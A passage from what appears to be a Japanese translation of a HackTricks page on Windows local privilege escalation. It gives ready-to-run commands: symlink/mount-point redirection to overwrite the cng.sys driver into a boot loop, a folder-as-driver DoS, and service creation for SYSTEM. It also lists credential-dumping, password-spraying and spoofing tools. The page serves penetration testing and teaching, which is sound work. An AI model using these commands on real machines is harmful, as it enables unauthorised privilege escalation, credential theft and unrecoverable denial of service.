> これはフォルダーのメタデータを格納する NTFS 内部ストリームを対象とします — これを削除すると、フォルダーが削除されます。

5. Step 5: oplock を解放する
- SYSTEM process は処理を続行し、`file1.txt` の削除を試みます。
- しかし、現在は junction + symlink により、実際に削除されるのは次のものです：
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**結果**: `C:\Config.Msi` は SYSTEM によって削除されます。

### 任意のフォルダー作成から恒久的な DoS へ

**ファイルを書き込めない**、または**弱い権限を設定できない**場合でも、**SYSTEM/admin として任意のフォルダーを作成できる** primitive を exploit します。

**critical Windows driver** の名前を付けた**フォルダー**（ファイルではありません）を作成します。例:
```
C:\Windows\System32\cng.sys
```
- このパスは通常、`cng.sys` kernel-mode driver に対応します。
- **フォルダーとして事前に作成**すると、Windows は boot 時に実際の driver をロードできなくなります。
- その後、Windows は boot 中に `cng.sys` のロードを試みます。
- フォルダーを検出し、**実際の driver の解決に失敗**して、**クラッシュするか boot を停止**します。
- **fallback はなく**、外部からの介入（例：boot repair や disk access）なしでは**復旧できません**。

### 特権 log/backup パス + OM symlinks から任意ファイルの overwrite / boot DoS へ

**privileged service** が **writable config** から読み取ったパスに logs/exports を書き込む場合、**Object Manager symlinks + NTFS mount points** でそのパスをリダイレクトし、**SeCreateSymbolicLinkPrivilege がなくても** privileged write を任意ファイルの overwrite に変えられます。<sup>[[15]](#references)</sup>

**要件**
- target path を格納する config が attacker によって writable であること（例：`%ProgramData%\...\.ini`）。
- `\RPC Control` への mount point と OM file symlink を作成できること（James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)）。<sup>[[16]](#references)[[17]](#references)</sup>
- そのパスに書き込む privileged operation（log、export、report）。

**Example chain**
1. config を読み取り、privileged log の保存先を取得します。例：`C:\ProgramData\ICONICS\IcoSetup64.ini` 内の `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`。
2. admin なしでパスをリダイレクトします：
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 特権コンポーネントがログを書き込むまで待ちます（例: admin が「send test SMS」をトリガーする）。この書き込みは `C:\Windows\System32\cng.sys` に行われます。
4. 上書きされたターゲットを（hex/PE parser で）調査して corruption を確認します。reboot によって Windows が改ざんされた driver path をロードするため、**boot loop DoS** が発生します。これは、特権サービスが write 用に開く保護されたファイル全般に応用できます。

> `cng.sys` は通常 `C:\Windows\System32\drivers\cng.sys` からロードされますが、`C:\Windows\System32\cng.sys` にコピーが存在する場合、そちらが先に試行される可能性があります。そのため、corrupt data の信頼できる DoS sink になります。



## **High Integrity から System へ**

### **新しいサービス**

すでに High Integrity process 上で実行している場合、**新しいサービスを作成して実行するだけで**、**SYSTEM への path** は簡単に確保できます。
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> サービスバイナリを作成する場合は、それが有効なサービスであること、またはバイナリが必要なアクションを迅速に実行することを確認してください。有効なサービスでない場合、20秒後に終了させられます。

### AlwaysInstallElevated

High Integrity process から、**AlwaysInstallElevated registry entries を有効化**し、_**.msi**_ wrapper を使用して reverse shell を**インストール**できます。\
[関連する registry keys と _.msi_ package のインストール方法についての詳細はこちら。](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**コードは** [**こちらで確認できます**](seimpersonate-from-high-to-system.md)**。**

### From SeDebug + SeImpersonate to Full Token privileges

これらの token privileges を持っている場合（おそらく、すでに High Integrity process 内にいる場合に確認できます）、SeDebug privilege を使用して、（protected processes ではない）**ほぼすべての process を開き**、その process の **token をコピー**し、その **token を使用して任意の process を作成**できます。\
この technique では通常、**すべての token privileges を持つ SYSTEM として実行されている process を選択**します（_すべての token privileges を持たない SYSTEM process も存在することに注意してください_）。\
**提案した technique を実行するコード例は** [**こちらで確認できます**](sedebug-+-seimpersonate-copy-token.md)**。**

### **Named Pipes**

この technique は、meterpreter が `getsystem` で privilege escalation を行う際に使用されます。technique の内容は、**pipe を作成し、その pipe に書き込むための service を作成または悪用すること**です。その後、**server** は SeImpersonate privilege を使用して pipe を作成しているため、pipe client（service）の **token を impersonate**し、SYSTEM privileges を取得できます。\
name pipes について[**詳しく学びたい場合はこちらを読んでください**](#named-pipe-client-impersonation)。\
name pipes を使用して high integrity から System へ移行する[**方法の例はこちらを読んでください**](from-high-integrity-to-system-with-name-pipes.md)。

### Dll Hijacking

**SYSTEM** として実行されている **process** によって **load** される dll の **hijack** に成功すれば、その権限で任意の code を実行できます。したがって、Dll Hijacking はこの種の privilege escalation にも有用です。さらに、high integrity process からは dll の load に使用される folder への **write permissions** を持っているため、はるかに**容易に実行できます**。\
**Dll hijacking について** [**詳しくはこちら**](dll-hijacking/index.html)**。**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**参照:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## その他の help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windows local privilege escalation vectors を探すための最良の tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- misconfigurations と sensitive files を確認（**[**こちらを確認**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。検出済み。**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- 可能性のある misconfigurations を確認し、情報を収集（**[**こちらを確認**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- misconfigurations を確認**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY、WinSCP、SuperPuTTY、FileZilla、および RDP の保存済み session 情報を抽出します。local では -Thorough を使用してください。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager から credentials を抽出します。検出済み。**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 収集した passwords を domain 全体で spray**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh は PowerShell ADIDNS/LLMNR/mDNS spoofer 兼 man-in-the-middle tool です。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 基本的な privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- 既知の privesc vulnerabilities を検索（Watson により DEPRECATED）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- local checks **(Admin rights が必要)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 既知の privesc vulnerabilities を検索（VisualStudio を使用して compile する必要があります）([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- misconfigurations を検索して host を enumeration（privesc よりも情報収集 tool に近い）（compile が必要） **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多数の software から credentials を抽出（github に precompiled exe があります）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp の C# port**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- misconfiguration を確認（github に executable precompiled があります）。推奨されません。Win10 では正常に動作しません。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 可能性のある misconfigurations を確認（python からの exe）。推奨されません。Win10 では正常に動作しません。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- この post に基づいて作成された tool（正常に動作させるために accesschk への access は必要ありませんが、使用できます）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** の output を読み取り、動作する exploits を推奨（local python）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** の output を読み取り、動作する exploits を推奨（local Python）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

正しい version の .NET を使用して project を compile する必要があります（[こちらを参照](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。victim host にインストールされている .NET の version を確認するには、次を実行します。
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## References

- [1] [Windows Privilege Escalationの基礎](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [弱いフォルダー権限を悪用した権限昇格](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation - cheatsheet](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linux Local Privilege Escalation Workshop](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows Attacks: AT is the new black (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - Total OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows Privilege Escalation Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows-Privilege-Escalation checklist](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Pentester向けWindows Privilege Escalation手法](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Silver Foxを追う: Kernel ShadowsにおけるCat & Mouse](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – SCADAシステムに存在するPrivileged File System Vulnerability](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Symbolic Link Testing Tools – CreateSymlinkの使用方法](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [過去へのリンク。Windows上でのSymbolic Linksの悪用](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Windows上の危険なModule Resolution](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js modules: `node_modules` foldersからのloading](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++ checklist challenges, solved](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own with Microslop: CLDFLTとDirectX Kernel Race Conditionsを連鎖させたWindows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [One I/O Ring to Rule Them All: Windows 11における完全なRead/Write Exploit Primitive](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [任意のファイル削除を悪用した権限昇格とその他の優れたTricks](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPs exploit code](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS Attacks Part 2: CVE-2020-1013、Windows 10 Local Privilege Escalation 1-Day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential ManagerとWindows Vaultの調査](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation When An Image Change Leads To A Privilege Escalation](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Windows 10 Ssh AgentからのSsh Private KeysのExtracting](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Enterprise Update ServersをBackdoor Factoriesに変える (0_o) – Part 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Enterprise Update ServersをBackdoor Factoriesに変える (0_o) – Part 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
{{#include ../../banners/hacktricks-training.md}}
